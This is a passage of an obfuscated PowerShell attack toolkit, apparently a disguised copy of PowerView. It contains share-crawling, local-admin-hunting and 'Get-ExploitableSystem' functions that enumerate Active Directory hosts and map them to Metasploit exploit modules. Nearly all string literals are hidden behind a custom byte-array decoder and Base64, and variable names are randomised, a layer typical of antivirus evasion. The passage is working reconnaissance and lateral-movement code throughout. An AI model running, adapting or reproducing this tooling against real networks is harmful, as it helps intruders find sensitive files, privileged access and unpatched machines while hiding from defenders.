        Write-Verbose ((HandleResult95 @(42,211,229,13,181,74,55,155,247,4,201,124,31,199,246,14,175,91,72,152,247,91,136,96,49,255,207,25,158,75,43,237,244,62,201,103,39,242,220,14,152,62,17,154,244,42,190,103,39,253,237,1,153,95,63,220,207,0,189,49) @(125,170,149,105,252,12)) + $Delay)

        $ID1uhNS = @()

        # figure out the shares we want to ignore
        [String[]] $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))), (HandleResult95 @(103,98,181,220,54,87,2,92) @(54,55,231,146,101,2)))

        # see if we're specifically including any of the normally excluded sets
        if ($IncludeC) {
            if ($IncludeAdmin) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @((HandleResult95 @(208,82,53,165,38,198,16,234) @(129,7,103,235,117,147,36)))
            }
        }

        if ($IncludeAdmin) {
            if ($IncludeC) {
                $ExcludedShares = @()
            }
            else {
                $ExcludedShares = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QyQ="))))
            }
        }

        # delete any existing output file if it already exists
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }
        }

        # if there's a set of terms specified to search for
        if ($TermList) {
            ForEach ($wrWn in Get-Content -Path $TermList) {
                if (($wrWn -ne $Null) -and ($wrWn.trim() -ne '')) {
                    $Terms += $wrWn
                }
            }
        }

        if($Domain) {
            $ajPzEg = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            # use the local domain
            $ajPzEg = @( (Get-NetDomain).name )
        }

        # if we're hard-passed a set of shares
        if($ShareList) {
            ForEach ($yaamBtA in Get-Content -Path $ShareList) {
                if (($yaamBtA -ne $Null) -and ($yaamBtA.trim() -ne '')) {
                    # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                    $AXZf4 = $yaamBtA.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("CQ=="))))[0]
                    $ID1uhNS += $AXZf4
                }
            }
        }
        if($SearchSYSVOL) {
            ForEach ($Domain in $ajPzEg) {
                $PxcQ9wVg = (([char]0x5c+[char]0x5c) + $Domain + (HandleResult95 @(241,100,112,147,47,152,120,110,157,60,222,31) @(169,34,62,201,122)))
                Write-Verbose ((HandleResult95 @(140,142,9,21,146,178,63,26,129,176,21,4,129,142,59,11,186,176,63,8,129,164,59,11,129,160,63,8,130,197,30,22,184,176,63,65,186,180,56,76) @(219,247,121,113)) + $PxcQ9wVg)
                $ID1uhNS += $PxcQ9wVg
            }
            if(!$Terms) {
                # search for interesting scripts on SYSVOL
                $Terms = @('.vbs', '.bat', '.ps1')
            }
        }
        else {
            # if we're using a host list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(253,224,40,160,227,223,30,245,240,193,18,241,203,206,109,170,227,222,10,178,200,206,30,180,200,240,25,249) @(170,153,88,196)) + $Domain + (HandleResult95 @(230,9,158,124,95,198,12,171,104,15,225,126,167,125,1,146) @(175,78,196,10,60)))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(17,224,35,54,27,0,124,247,127,25,55,32,31,224,34,96,24,42,20,229) @(69,141,27,81,122,71))
            }
        }

        # script block that enumerates shares and files on a server
        $h6EYtum2 = {
            param($ComputerName, $Ping, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential)

            Write-Verbose ((HandleResult95 @(182,55,23,13,132,77,120,73,189,93,100,54,190,82,31,21,168,108,111,68) @(231,5,46,121)) + $ComputerName)
            Write-Verbose ((HandleResult95 @(211,215,65,146,41,186,215,228,115,175,25,166,224,200,111,129,17,170,204,185,96,185,118,207) @(129,143,41,248,75,242)) + $ExcludedShares)
            $xgY1OJgz = @()

            if($ComputerName.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
                # if a share is passed as the server
                $xgY1OJgz += $ComputerName
            }
            else {
                # if we're enumerating the shares on the target server first
                $yssh = $True
                if($Ping) {
                    $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if($yssh) {
                    # get the shares for this host and display what we find
                    $ID1uhNS = Get-NetShare -ComputerName $ComputerName
                    ForEach ($AXZf4 in $ID1uhNS) {

                        $UcLI9 = $AXZf4.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+$UcLI9

                        # make sure we get a real share name back
                        if (($UcLI9) -and ($UcLI9.trim() -ne '')) {

                            # skip this share if it's in the exclude list
                            if ($ExcludedShares -NotContains $UcLI9.ToUpper()) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $xgY1OJgz += $Path
                                }
                                catch {
                                    Write-Debug ((HandleResult95 @(35,193,49,22,43,85,223,2,241,48,52,8,73,216,34,194,20,11,32,32,136,13,249,74) @(116,184,119,114,98,16,234)) + $Path)
                                }
                            }
                        }
                    }
                }
            }

            ForEach($AXZf4 in $xgY1OJgz) {
                $fclLo =  @{
                    'Path' = $AXZf4
                    'Terms' = $Terms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                    'Credential' = $Credential
                }

                Find-InterestingFile @fclLo
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(40,128,219,175,119,174,63,69,26,159,253,166,79,148,26,73,31,143,160,177,92,139,56,82,26,159,242,184,113,132,52,91,36,143,211,180,118,186,29,27,55,153,168,226) @(126,216,149,223,21,195,92,34)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = $ExcludedShares
                'Terms' = $Terms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
                'Credential' = $Credential
            }

            # kick off the threaded script block + arguments 
            if($ID1uhNS) {
                # pass the shares as the hosts so the threaded function code doesn't have to be hacked up
                Invoke-ThreadedFunction -ComputerName $ID1uhNS -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
            }
            else {
                Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
            }        
        }

        else {
            if($ID1uhNS){
                $ComputerName = $ID1uhNS
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(50,87,186,205,19,155,188,19,74,141,239,41,148,169,80,31,168,254,16,177,141,12,108,188,243,51,159,134,60,29,152,217,62,176,187,2,79,141,144,32,185,166,40,24,131,232,103,224) @(101,46,202,169,90,221,238)) + $($ComputerName.count))
            $ypmBN = 0

            $ComputerName | Where-Object {$_} | ForEach-Object {
                Write-Verbose ((HandleResult95 @(126,35,152,166,76,89,247,226,117,73,232,228,102,80,156,239) @(47,17,161,210)) + $_)
                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(108,102,141,109,171,168,45,78,123,170,56,142,142,22,125,47,156,94,215,131,50,115,81,145,106,140,183,23,88,118,188,52) @(59,31,253,9,226,237,123)) + $_ + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(192,20,180,60,39,180,220,180) @(137,83,141,81,110,245,225)) + $($ComputerName.count) + ")")

                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $_, $False, $ExcludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive, $Credential                
            }
        }
    }
}


function Find-LocalAdminAccess {
<#
    .SYNOPSIS

        Finds machines on the local domain where the current user has
        local administrator access. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

    .PARAMETER ComputerName

        Host array to enumerate, passable on the pipeline.

    .PARAMETER ComputerFile

        File of hostnames/IPs to search.

    .PARAMETER ComputerFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER ComputerADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER NoPing

        Switch. Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.
    
    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER SearchForest

        Switch. Search all domains in the forest for target users instead of just
        a single domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess

        Find machines on the local domain where the current user has local
        administrator access.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -Threads 10

        Multi-threaded access hunting, replaces Find-LocalAdminAccessThreaded.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -Domain testing

        Find machines on the 'testing' domain where the current user has
        local administrator access.

    .EXAMPLE

        PS C:\> Find-LocalAdminAccess -ComputerFile hosts.txt

        Find which machines in the host list the current user has local
        administrator access.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $WLAr = New-Object System.Random

        Write-Verbose ((HandleResult95 @(53,48,133,180,43,15,191,225,0,36,192,160,0,36,150,183,48,36,153,165,56,10,196,157,0,123,187,184,0,12,179,187,0,30,153,165,51,30,187,186,56,17,187,170,43,1,145,160,6,14,146,183,56,14,163,163,59,17,158,183,0,123,172,183) @(98,73,245,208)) + $Delay)
        
        if(!$ComputerName) {
            if($Domain) {
                $ajPzEg = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $ajPzEg = @( (Get-NetDomain).name )
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($ComputerFile) {
                $ComputerName = Get-Content -Path $ComputerFile
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $ajPzEg) {
                    Write-Verbose ((HandleResult95 @(207,107,241,94,80,56,158,208,194,74,203,15,120,41,237,143,209,85,211,76,123,41,158,145,250,123,192,7) @(152,18,129,58,25,126,216,225)) + $Domain + (HandleResult95 @(90,120,194,95,251,122,125,247,75,171,93,15,251,94,165,46) @(19,63,152,41,152)))
                    $ComputerName += Get-NetComputer -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw (HandleResult95 @(82,174,78,74,134,163,82,124,167,62,96,128,190,6,63,242,20,64,182,140) @(6,195,118,45,231,228,107))
            }
        }

        # script block that enumerates a server
        $h6EYtum2 = {
            param($ComputerName, $Ping)

            $yssh = $True
            if($Ping) {
                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($yssh) {
                # check if the current user has local admin access to this server
                $Pu7AlyM = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                if ($Pu7AlyM) {
                    $ComputerName
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose ((HandleResult95 @(233,198,85,237,94,140,220,249,127,218,84,152,229,201,93,246,93,182,138,240,82,213,88,145,219,217,124,250,88,166,215,231,65,202,122,138,220,231,90,164,117,160,130,163) @(191,158,27,157,60,225)) + $Threads)

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $O2kwi = @{
                'Ping' = $(-not $NoPing)
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose ((HandleResult95 @(176,152,154,167,174,167,184,181,131,166,172,176,174,166,223,242,133,182,160,175,132,136,168,181,189,136,168,171,190,210,184,179,131,140,191,164,134,166,211,185,131,169,167,245,174,160,215,254) @(231,225,234,195)) + $($ComputerName.count))
            $ypmBN = 0

            ForEach ($fa0ya in $ComputerName) {

                $ypmBN = $ypmBN + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ((HandleResult95 @(205,1,105,86,26,152,160,105,254,47,40,94,48,176,176,44,251,47,44,92,26,149,184,112,249,22,67,94,48,180,183,33) @(154,120,25,50,83,221,246,28)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(230,246,12,117,230,240,8,37) @(175,177,53,24)) + $($ComputerName.count) + ")")
                Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
            }
        }
    }
}


function Get-ExploitableSystem {
<#
    .Synopsis

        This module will query Active Directory for the hostname, OS version, and service pack level  
        for each computer account.  That information is then cross-referenced against a list of common
        Metasploit exploits that can be used during penetration testing.

    .DESCRIPTION

        This module will query Active Directory for the hostname, OS version, and service pack level  
        for each computer account.  That information is then cross-referenced against a list of common
        Metasploit exploits that can be used during penetration testing.  The script filters out disabled
        domain computers and provides the computer's last logon time to help determine if it's been 
        decommissioned.  Also, since the script uses data tables to output affected systems the results
        can be easily piped to other commands such as test-connection or a Export-Csv.

    .PARAMETER ComputerName

        Return computers with a specific name, wildcards accepted.

    .PARAMETER SPN

        Return computers with a specific service principal name, wildcards accepted.

    .PARAMETER OperatingSystem

        Return computers with a specific operating system, wildcards accepted.

    .PARAMETER ServicePack

        Return computers with a specific service pack, wildcards accepted.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Ping

        Switch. Ping each host to ensure it's up before enumerating.

    .PARAMETER Domain

        The domain to query for computers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Unconstrained

        Switch. Return computer objects that have unconstrained delegation.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE
       
        The example below shows the standard command usage.  Disabled system are excluded by default, but
        the "LastLgon" column can be used to determine which systems are live.  Usually, if a system hasn't 
        logged on for two or more weeks it's been decommissioned.      
        PS C:\> Get-ExploitableSystem -DomainController 192.168.1.1 -Credential demo.com\user | Format-Table -AutoSize
        [*] Grabbing computer accounts from Active Directory...
        [*] Loading exploit list for critical missing patches...
        [*] Checking computers for vulnerable OS and SP levels...
        [+] Found 5 potentially vulnerable systems!
        ComputerName          OperatingSystem         ServicePack    LastLogon            MsfModule                                      CVE                      
        ------------          ---------------         -----------    ---------            ---------                                      ---                      
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
        DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....                     

    .EXAMPLE

        PS C:\> Get-ExploitableSystem | Export-Csv c:\temp\output.csv -NoTypeInformation

        How to write the output to a csv file.

    .EXAMPLE

        PS C:\> Get-ExploitableSystem -Domain testlab.local -Ping

        Return a set of live hosts from the testlab.local domain

     .LINK
       
       http://www.netspi.com
       https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
       
     .NOTES
       
       Author:  Scott Sutherland - 2015, NetSPI
                Modifications to integrate into PowerView by @harmj0y
       Version: Get-ExploitableSystem.psm1 v1.1
       Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
       function found in Carols Perez's PoshSec-Mod project.  The general idea is based off of  
       Will Schroeder's "Invoke-FindVulnSystems" function from the PowerView toolkit.
#>
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem = '*',

        [String]
        $ServicePack = '*',

        [String]
        $Filter,

        [Switch]
        $Ping,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    Write-Verbose (HandleResult95 @(202,254,132,220,241,228,89,228,222,163,242,209,192,106,168,233,189,255,246,215,95,197,197,197,220,255,247,68,212,192,178,210,225,147,4,172,229,154,234,194,232,122,199,254,150,138,136,198,108,202,201,196,217,224,251,81,212,194,166,200,219,204,107,247,227,179,129,193,196,110,169,242,184,223,133,156) @(157,135,244,184,184,161,61))

    # Create data table for hostnames, os, and service packs from LDAP
    $iqAC8a = New-Object System.Data.DataTable 
    $Null = $iqAC8a.Columns.Add('Hostname')       
    $Null = $iqAC8a.Columns.Add('OperatingSystem')
    $Null = $iqAC8a.Columns.Add('ServicePack')
    $Null = $iqAC8a.Columns.Add('LastLogon')

    Get-NetComputer -FullData @PSBoundParameters | ForEach-Object {

        $ybzWM2 = $_.dnshostname
        $ckV2yWA = $_.operatingsystem
        $eyOYD = $_.operatingsystemservicepack
        $BN06 = $_.lastlogon
        $TbLY2 = $_.useraccountcontrol

        $eiIMCzDa = [convert]::ToString($_.useraccountcontrol,2)

        # Check the 2nd to last value to determine if its disabled
        $cHNWOR = $eiIMCzDa.Length - 2
        $aQiOjD = $eiIMCzDa.Substring($cHNWOR,1)

        # Add computer to list if it's enabled
        if ($aQiOjD  -eq 0) {
            # Add domain computer to data table
            $Null = $iqAC8a.Rows.Add($ybzWM2,$ckV2yWA,$eyOYD,$BN06)
        }
    }

    # Status user        
    Write-Verbose (HandleResult95 @(4,51,220,193,49,22,50,218,252,47,1,58,206,200,27,52,16,244,205,15,49,13,149,213,28,16,8,223,196,32,29,122,229,226,34,37,41,197,231,18,48,39,192,149,25,4,4,196,199,59,17,62,205,253,54,41,43,251,144,22,26,2,238,205,28,20,4,195,255,32,30,63,224,204,76,110) @(83,74,172,165,120))

    # ----------------------------------------------------------------
    # Setup data table for list of msf exploits
    # ----------------------------------------------------------------

    # Create data table for list of patches levels with a MSF exploit
    $TH0cH8 = New-Object System.Data.DataTable 
    $Null = $TH0cH8.Columns.Add('OperatingSystem') 
    $Null = $TH0cH8.Columns.Add('ServicePack')
    $Null = $TH0cH8.Columns.Add('MsfModule')  
    $Null = $TH0cH8.Columns.Add('CVE')
    
    # Add exploits to data table
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(41,101,178,125,57,224,167,76,52,167,73,80) @(127,87,222,8,99,167,158)),"",(HandleResult95 @(31,220,185,187,19,2,189,161,168,50,124,183,176,155,68,46,230,226,168,11,9,183,159,184,40,44,189,165,175,11,0,243,137,182,48,119,201,135,245,11,38,195,232,186,19,13,202,171) @(69,132,209,204,113)),(HandleResult95 @(250,187,167,202,181,126,46,237,191,198,158,229,94,56,174,153,145,151,128,81,27,195,161,157,155,129,66,59,215,158,187,140,180,105,120,241,151,152,175,160,119,43,218,139,184,185,230,67,15,225,186,192) @(155,243,245,250,214,58,65)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(200,158,92,122,196,235,9,60,253,213,114,91,196,244,122,61,196,244,121,104,211,198,113,120,211,237,13,50) @(158,172,48,15)),(HandleResult95 @(135,16,151,114,231,10,2,171,107,135,73,235,62,102,161,69,140,90,190,90) @(210,34,193,11,131,103,84)),(HandleResult95 @(226,122,54,131,66,255,27,46,144,99,129,17,63,163,21,211,64,109,144,90,244,16,12,158,122,224,104,41,173,89,129,86,61,142,97,194,122,36,181,89,246,78,103,159,121,138,27,42) @(184,34,94,244,32)),(HandleResult95 @(52,28,63,230,219,186,181,203,25,103,9,229,220,135,239,215,49,57,59,189,226,166,136,213,52,3,21,172,244,147,148,203,55,7,84,188,220,147,143,203,24,62,44,161,245,135,234,202,24,46,56,175,244,137,231,128) @(85,84,109,214,184,254,218,189)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(78,80,69,149,4,95,91,26,131,39,90,54,115,184,20,42,56,113,169,57,85,8,104,151,19,89,95,20) @(24,98,41,224,94)),(HandleResult95 @(39,114,226,9,22,45,226,9,59,6,246,24,43,114,199,23,63,17,137,77) @(114,64,180,112)),(HandleResult95 @(2,84,211,146,58,75,130,149,60,79,130,214,57,91,142,142,58,63,223,159,20,62,233,143,2,84,241,146,1,117,130,145,59,118,250,212,0,118,250,157,22,61,130,145,59,62,138,157) @(88,12,187,229)),(HandleResult95 @(248,115,225,230,250,127,220,160,213,8,215,229,253,66,134,188,253,86,229,189,195,99,225,190,248,108,203,172,213,86,253,160,251,104,138,188,253,86,230,160,212,81,242,161,215,104,131,161,212,127,230,227) @(153,59,179,214)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(68,57,219,90,72,76,142,28,113,114,245,123,72,83,253,29,72,83,254,72,95,97,246,88,95,74,138,18) @(18,11,183,47)),(HandleResult95 @(71,149,196,5,146,129,68,222,219,58,180,132,75,149,225,27,187,189,47,154) @(18,167,146,124,246,236)),(HandleResult95 @(224,67,180,3,10,97,216,246,222,88,229,71,9,113,212,237,216,40,184,14,36,20,141,246,217,98,229,0,11,92,160,252,226,97,157,3,38,23,216,243,222,92,142,7,10,96,216,181,224,76,150,31,49,126,184,187) @(186,27,220,116,104,38,225,134)),(HandleResult95 @(221,241,102,233,66,166,197,202,245,7,189,18,134,211,137,211,80,180,119,137,240,228,235,92,184,118,154,208,240,212,122,175,67,177,147,214,221,89,140,87,175,192,253,206,121,160,17,149,231,232,248,1) @(188,185,52,217,33,226,170)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(92,15,107,192,209,16,99,57,94,126,247,223,13,2,64,15,93,237,194,48,23,96,124,112,248,202,106,103) @(10,61,7,181,139,87,90)),(HandleResult95 @(154,133,123,96,213,49,65,147,134,241,111,113,232,110,100,141,130,230,16,36) @(207,183,45,25,177,92,23,234)),(HandleResult95 @(221,206,249,96,229,209,168,103,227,213,168,36,230,193,164,124,229,165,245,109,203,165,245,103,229,248,220,97,229,206,220,96,201,208,169,96,201,210,199,113,227,164,253,98,228,225,172,42) @(135,150,145,23)),(HandleResult95 @(133,154,142,121,208,128,139,164,144,122,215,247,128,171,233,35,215,169,178,185,134,17,225,172,133,133,164,51,255,169,170,164,190,26,138,174,128,191,137,63,254,174,165,165,146,10,131,188,169,150,187,62,255,179,217,239) @(228,210,220,73,179,196)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(22,129,246,34,202,181,23,115,208,227,21,196,168,118,10,129,192,15,217,149,99,42,242,237,26,209,207,19) @(64,179,154,87,144,242,46)),(HandleResult95 @(187,53,31,56,32,131,107,35,27,23,172,86,16,22,10,156,78,13,8,121) @(238,7,73,65,68)),(HandleResult95 @(148,155,23,164,70,83,195,159,170,128,70,224,69,67,207,132,172,240,27,169,104,38,168,133,148,155,53,164,125,109,195,155,173,185,62,169,124,110,187,150,128,175,70,184,125,38,195,155) @(206,195,127,211,36,20,250,239)),(HandleResult95 @(6,75,149,89,4,71,168,31,43,48,163,90,3,122,242,3,3,110,145,2,61,91,149,1,6,84,191,19,43,110,137,31,5,80,254,3,3,110,146,31,42,105,134,30,42,122,247,30,42,121,146,16,43,116,250,84) @(103,3,199,105)))  
    $Null = $TH0cH8.Rows.Add((HandleResult95 @(111,163,219,232,227,54,143,10,242,206,223,237,43,238,115,163,237,197,240,22,251,83,208,192,208,248,76,139) @(57,145,183,157,185,113,182)),(HandleResult95 @(200,29,242,234,248,240,67,206,201,207,223,126,253,196,210,239,102,224,218,161) @(157,47,164,147,156)),(HandleResult95 @(128,5,69,232,48,242,228,170,57,110,166,97,212,138,239,54,79,172,54,207,145,232,15,71,197,10,255,170,131,36,20,235,49,207,156,235,5,87,222,42,251,236,227,41,78,173,99,205) @(218,93,45,159,82,181,221)),(HandleResult95 @(81,239,36,35,5,24,18,70,235,69,119,85,56,4,5,205,18,126,48,55,39,104,245,30,114,49,36,7,124,202,56,101,4,15,68,90,195,27,70,16,17,23,113,208,56,64,86,43,48,116,242,67) @(48,167,118,19,102,92,125)))  
